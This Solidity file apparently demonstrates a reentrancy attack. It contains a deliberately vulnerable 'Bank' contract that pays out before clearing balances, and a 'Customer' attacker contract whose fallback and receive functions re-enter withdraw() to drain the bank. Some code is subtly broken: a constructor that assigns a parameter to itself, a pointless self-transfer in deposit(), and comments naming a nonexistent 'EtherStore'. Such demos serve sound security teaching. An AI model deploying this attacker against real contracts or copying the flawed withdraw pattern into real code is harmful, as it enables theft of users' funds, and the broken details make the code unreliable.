// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.4.2 <0.9.0;

contract Bank {
    // A vulnerable bank smart contract.
    mapping (address => uint256) balances;
    
    // This gives the amount/ether strored in the smart contract.
    function deposit(uint256 index) public payable {
        // Consumes a lot of gas.
        // May fail the deposit call()
        uint256 counter = index;
        while (counter > 0) 
            counter -= 1;
            
        (bool sent, bytes memory data) = payable(address(this))
                                    .call{value:msg.value}("");
        balances[msg.sender] += msg.value;
    }
    
    // web3.utils.toWei('1', 'ether') else goes to fallback since
    // arguments error.
    function withdraw()
        public
        payable
    {
        (bool sent, bytes memory data) = msg.sender
                           .call{value:balances[msg.sender]}("");
        require(sent, "Failed to send Ether");
        balances[msg.sender] = 0;
    }
}


contract Customer {
    uint256 counter = 0;
    Bank public etherStore;

    constructor(address _etherStoreAddress, uint256 counter) {
        etherStore = Bank(_etherStoreAddress);
        counter = counter;
    }
    
        // Fallback is called when EtherStore sends Ether to this contract.
    fallback() external payable {
        if (address(etherStore).balance >= 1 ether) {
            counter +=  1;
            etherStore.withdraw();
        }
    }

    // Fallback is called when EtherStore sends Ether to this contract.
    receive() external payable {
        if (address(etherStore).balance >= 1 ether) {
            counter +=  1;
            etherStore.withdraw();
        }
    }
    
    function simulate() external payable {
        require(msg.value >= 1 ether, "More than 1 ether needed");
        etherStore.deposit{value: 1 ether}(counter);
        etherStore.withdraw();
    }
}